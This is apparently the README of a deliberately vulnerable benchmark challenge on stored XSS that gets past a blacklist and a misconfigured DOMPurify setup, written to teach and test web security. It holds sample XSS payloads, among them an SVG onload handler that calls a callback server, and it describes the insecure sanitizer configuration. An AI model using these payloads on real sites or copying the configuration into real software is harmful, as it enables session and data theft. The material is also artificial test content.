# S7BEN-HARD-002: XSS with Input Sanitization Bypass

**Category:** A03:2021 - Injection
**Difficulty:** Medium
**Points:** 150

## Overview

This benchmark challenges you to bypass multiple layers of input sanitization to achieve stored Cross-Site Scripting (XSS). The application implements both custom blacklist filtering and DOMPurify sanitization, but a misconfiguration allows certain attack vectors to slip through.

**Learning Focus:**
- DOMPurify configuration vulnerabilities
- Sanitization bypass techniques
- SVG-based XSS vectors
- Difference between blacklist and whitelist filtering

## Quick Start

```bash
make up      # Build and start services
make test    # Run health checks
make exploit # Run automated exploitation (optional)
make down    # Stop and cleanup
```

## Architecture

**2 Containers:**
- **node-app** (port 3000) - Vulnerable Node.js application
- **callback-server** (port 8080, internal) - Exploitation verification

## Target

- **URL:** http://localhost:3000
- **Admin Panel:** http://localhost:3000/admin
- **Telemetry:** http://localhost:3000/api/telemetry
- **Flag Format:** `S7BEN{...}`

## Sanitization Layers

The application implements two defense layers:

### Layer 1: Custom Blacklist Filter
Blocks the following patterns:
- `<script>` tags
- `<iframe>` tags
- `javascript:` protocol
- Event handlers (onclick, onerror, etc.)
- `<img>` tags

### Layer 2: DOMPurify Sanitization
Uses DOMPurify with the following configuration:
- **Allowed Tags:** b, i, em, strong, a, p, br, **svg**, g, path, circle
- **Allowed Attributes:** href, title, target, **onload**, **onerror**

⚠️ **Vulnerability:** The DOMPurify configuration allows SVG elements AND event handlers!

## Hints

1. Try posting different types of HTML content to see what gets blocked
2. The blacklist doesn't catch everything - some tags are allowed through
3. SVG elements can execute JavaScript in certain contexts
4. The admin panel at `/admin` automatically renders all comments
5. Event handlers on SVG elements behave differently than on other tags

## Exploitation Path

1. **Recon:** Test which HTML tags and attributes are allowed
2. **Bypass:** Find a tag that passes both filters but can execute JavaScript
3. **Exploit:** Submit payload via comment form
4. **Verify:** Check admin panel for code execution
5. **Exfiltrate:** Steal the flag displayed on the admin page

## Sample Test Payloads

```javascript
// Blocked by custom blacklist
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">

// Allowed by blacklist but might be caught by DOMPurify
<div onclick=alert(1)>click</div>

// Bypasses both layers (SVG + event handler)
<svg onload=alert(1)>
<svg onload=fetch("http://callback-server:8080/callback")>
```

## Flag Location

The flag is visible on the admin panel page at:
- **URL:** http://localhost:3000/admin
- **Element:** Inside `.flag-display code` element

## Telemetry

Monitor your exploitation progress:

```bash
curl http://localhost:3000/api/telemetry
```

Returns:
```json
{
  "benchmark_id": "S7BEN-HARD-002",
  "request_count": 15,
  "xss_attempts": 8,
  "sanitizer_blocks": 3,
  "callback_received": false,
  "comments_count": 5
}
```

## Reset Benchmark

```bash
make reset
# or
curl -X POST http://localhost:3000/reset
```

## Real-World Context

**DOMPurify CVE-2020-26870:**
DOMPurify versions prior to 2.2.0 allowed certain SVG-based XSS vectors when using default configurations. Applications that relied on default DOMPurify settings without customization were vulnerable.

**Impact:**
Multiple web applications, including enterprise SaaS platforms, were found vulnerable to XSS despite implementing DOMPurify sanitization. The vulnerability highlights the importance of proper sanitization library configuration.

## Learning Objectives

After completing this benchmark, you should understand:
- How sanitization libraries can be misconfigured
- Why blacklist-based filtering is insufficient
- SVG-based XSS attack vectors
- The importance of context-aware output encoding
- How to properly configure DOMPurify for security

## Files

```
S7BEN-HARD-002/
├── app/
│   ├── Dockerfile
│   ├── package.json
│   ├── server.js
│   ├── views/
│   │   ├── index.ejs
│   │   └── admin.ejs
│   └── public/
│       └── style.css
├── callback/
│   ├── Dockerfile
│   ├── package.json
│   └── server.js
├── docker-compose.yml
├── Makefile
├── benchmark.yaml
├── README.md (this file)
├── TESTING.md
└── exploit.py
```

## Troubleshooting

**Services not starting?**
```bash
docker compose logs -f
```

**Reset not working?**
```bash
make clean
make up
```

**Want more details?**
See `TESTING.md` for comprehensive exploitation guide.

## Warning

⚠️ **This benchmark contains intentional security vulnerabilities.**
Do not deploy in production environments. Use only in isolated testing environments.

## References

- [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [DOMPurify Security Advisories](https://github.com/cure53/DOMPurify/security/advisories)
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
